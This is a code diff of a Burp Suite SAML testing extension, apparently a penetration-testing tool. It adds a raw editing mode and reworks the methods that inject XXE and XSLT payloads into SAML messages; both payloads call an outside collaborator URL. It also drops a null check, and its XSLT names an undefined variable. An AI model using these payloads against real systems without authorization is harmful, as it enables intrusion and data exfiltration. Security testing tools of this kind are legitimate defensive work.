@@ -72,6 +72,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	private boolean isGZip = false;
 	private boolean isWSSUrlEncoded = false;
 	private ITextEditor textArea;
+	private ITextEditor textEditorInformation;
 	private SamlMain samlGUI;
 	private boolean editable;
 	private boolean isSOAPMessage;
@@ -82,6 +83,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	private XSWHelpers xswHelpers;
 	private HTTPHelpers httpHelpers;
 	private boolean isEdited = false;
+	private boolean isRawMode = false;
 
 	public SamlTabController(IBurpExtenderCallbacks callbacks, boolean editable,
 			CertificateTabController certificateTabController) {
@@ -89,8 +91,10 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 		this.callbacks = callbacks;
 		this.helpers = callbacks.getHelpers();
 		samlGUI = new SamlMain(this);
-		textArea = samlGUI.getTextArea();
+		textArea = samlGUI.getTextEditorAction();
 		textArea.setEditable(editable);
+		textEditorInformation = samlGUI.getTextEditorInformation();
+		textEditorInformation.setEditable(false);
 		xmlHelpers = new XMLHelpers();
 		xswHelpers = new XSWHelpers();
 		httpHelpers = new HTTPHelpers();
@@ -129,13 +133,18 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 			} else {
 				String textMessage = null;
 
-				try {
-					textMessage = xmlHelpers
-							.getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText())), 0, true);
-				} catch (IOException e) {
-					setInfoMessageText(XML_COULD_NOT_SERIALIZE);
-				} catch (SAXException e) {
-					setInfoMessageText(XML_NOT_WELL_FORMED);
+				if (isRawMode){
+					textMessage = new String(textArea.getText());
+				}
+				else {
+					try {
+						textMessage = xmlHelpers
+								.getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText())), 0, true);
+					} catch (IOException e) {
+						setInfoMessageText(XML_COULD_NOT_SERIALIZE);
+					} catch (SAXException e) {
+						setInfoMessageText(XML_NOT_WELL_FORMED);
+					}
 				}
 
 				String parameterToUpdate;
@@ -273,12 +282,9 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 						parameter = helpers.getRequestParameter(content, certificateTabController.getSamlResponseParameterName());
 					}
 
-					if (null != parameter) {
-						SAMLMessage = getDecodedSAMLMessage(parameter.getValue());
-					}
+					SAMLMessage = getDecodedSAMLMessage(parameter.getValue());
 				}
-				Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage);
-				SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
+
 			} catch (IOException e) {
 				e.printStackTrace();
 				setInfoMessageText(XML_COULD_NOT_SERIALIZE);
@@ -296,6 +302,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 			orgSAMLMessage = SAMLMessage;
 			textArea.setText(SAMLMessage.getBytes());
 			textArea.setEditable(editable);
+
 			setGUIEditable(editable);
 		}
 	}
@@ -316,12 +323,13 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 				infoPanel.setSubjectConfNotAfter(xmlHelpers.getSubjectConfNotAfter(assertion));
 				infoPanel.setSignatureAlgorithm(xmlHelpers.getSignatureAlgorithm(assertion));
 				infoPanel.setDigestAlgorithm(xmlHelpers.getDigestAlgorithm(assertion));
+				textEditorInformation.setText(xmlHelpers.getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage), 2, true).getBytes());
 			} else {
 				assertions = xmlHelpers.getEncryptedAssertions(document);
 				Node assertion = assertions.item(0);
 				infoPanel.setEncryptionAlgorithm(xmlHelpers.getEncryptionMethod(assertion));
 			}
-		} catch (SAXException e) {
+		} catch (SAXException|IOException e) {
 			setInfoMessageText(XML_NOT_WELL_FORMED);
 		}
 	}
@@ -336,6 +344,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 		infoPanel.setSignatureAlgorithm("");
 		infoPanel.setDigestAlgorithm("");
 		infoPanel.setEncryptionAlgorithm("");
+		textEditorInformation.setText("".getBytes());
 	}
 
 	public String getEncodedSAMLMessage(String message) {
@@ -411,6 +420,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 				SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
 				textArea.setText(SAMLMessage.getBytes());
 				isEdited = true;
+				setRawMode(false);
 				setInfoMessageText("Message signature successful removed");
 			} else {
 				setInfoMessageText("No Signatures available to remove");
@@ -423,9 +433,17 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	}
 
 	public void resetMessage() {
-		SAMLMessage = orgSAMLMessage;
+		if(isRawMode){
+			SAMLMessage = orgSAMLMessage;
+		}
 		textArea.setText(SAMLMessage.getBytes());
 		isEdited = false;
+	}
+
+	public void setRawMode(boolean rawModeEnabled){
+		isRawMode = rawModeEnabled;
+		isEdited = true;
+		samlGUI.getActionPanel().setRawModeEnabled(rawModeEnabled);
 	}
 
 	public void resignAssertion() {
@@ -448,6 +466,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 				SAMLMessage = xmlHelpers.getStringOfDocument(doc, 2, true);
 				textArea.setText(SAMLMessage.getBytes());
 				isEdited = true;
+				setRawMode(false);
 				setInfoMessageText("Assertions successfully signed");
 			} else {
 				setInfoMessageText("no certificate chosen to sign");
@@ -481,6 +500,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 					SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
 					textArea.setText(SAMLMessage.getBytes());
 					isEdited = true;
+					setRawMode(false);
 					setInfoMessageText("Message successfully signed");
 				} else {
 					setInfoMessageText("no certificate chosen to sign");
@@ -579,6 +599,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 			SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
 			textArea.setText(SAMLMessage.getBytes());
 			isEdited = true;
+			setRawMode(false);
 			setInfoMessageText(XSW_ATTACK_APPLIED);
 		} catch (SAXException e) {
 			setInfoMessageText(XML_NOT_WELL_FORMED);
@@ -590,17 +611,19 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	}
 	
 	public void applyXXE(String collabUrl) {
-		String dtd = "\n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \""+collabUrl+"\"> %xxe; ]>";
+		String xxePayload = "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"" + collabUrl + "\"> %xxe; ]>\n";
 		String[] splitMsg = orgSAMLMessage.split("\\?>");
-		if(splitMsg.length != 2) {
-			setInfoMessageText(XML_NOT_SUITABLE_FOR_XXE);
+		if(splitMsg.length == 2) {
+			SAMLMessage = splitMsg[0] + "?>" + xxePayload + splitMsg[1];
 		}
 		else {
-			SAMLMessage = splitMsg[0]+"?>"+dtd+splitMsg[1];
-			textArea.setText(SAMLMessage.getBytes());
-			isEdited = true;
-			setInfoMessageText(XXE_CONTENT_APPLIED);
+			String xmlDeclaration = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
+			SAMLMessage = xmlDeclaration + xxePayload + orgSAMLMessage;
 		}
+		textArea.setText(SAMLMessage.getBytes());
+		isEdited = true;
+		setRawMode(true);
+		setInfoMessageText(XXE_CONTENT_APPLIED);
 	}
 
 	public void applyXSLT(String collabUrl) {
@@ -609,7 +632,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 				"  <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
 				"    <xsl:template match=\"doc\">\n" +
 				"      <xsl:variable name=\"file\" select=\"'test'\"/>\n" +
-				"      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>" +
+				"      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>\n" +
 				"      <xsl:variable name=\"attackURL\" select=\"'" + collabUrl + "'\"/>\n" +
 				"      <xsl:variable name=\"exploitURL\" select=\"concat($attackerURL,$escaped)\"/>\n" +
 				"      <xsl:value-of select=\"unparsed-text($exploitURL)\"/>\n" +
@@ -629,6 +652,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 			SAMLMessage = firstPart + xslt + secondPart;
 			textArea.setText(SAMLMessage.getBytes());
 			isEdited = true;
+			setRawMode(true);
 			setInfoMessageText(XSLT_CONTENT_APPLIED);
 		}		
 	}
